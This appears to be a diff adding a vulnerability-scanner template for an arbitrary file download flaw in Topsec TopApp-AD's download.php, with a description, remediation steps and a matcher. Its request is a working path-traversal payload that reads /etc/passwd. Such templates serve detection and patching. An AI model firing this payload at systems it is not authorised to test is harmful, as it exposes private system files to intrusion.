@@ -1,0 +1,30 @@
+id: TopApp-AD_download_php-FileDownload
+info:
+  name: Topsec TopApp-AD download.php f parameter file download vulnerability
+  author:
+  - l0ne1y
+  description: |-
+    Topsec TopApp-AD download.php arbitrary file download vulnerability
+    Topsec TopApp-AD application delivery system is the application delivery device with the most complete functionality in the industry.
+
+    Topsec TopApp-AD has an arbitrary file download vulnerability. Attackers can exploit it to read arbitrary file contents.
+  severity: medium
+  remediation: |-
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.topsec.com.cn/
+
+    Temporary remedy:
+    1. Filter "." so that users cannot traverse to parent directories in the URL.
+    2. Use regular expressions to strictly validate the format of user input parameters, hard-code or uniformly encode the file name parameters passed by users, control file types via a whitelist, and reject parameters containing malicious or empty characters.
+    3. Prohibit the system from providing directory traversal services, e.g., configure open_basedir in php.ini to limit the file access scope.
+    4. Store file paths in the database and let users submit the file ID to download files.
+    5. Perform permission checks before users download files.
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"bin/ash")
+  path:
+  - '{{BaseURL}}/acc/vpn/download.php?f=../../etc/passwd'
+  method: GET
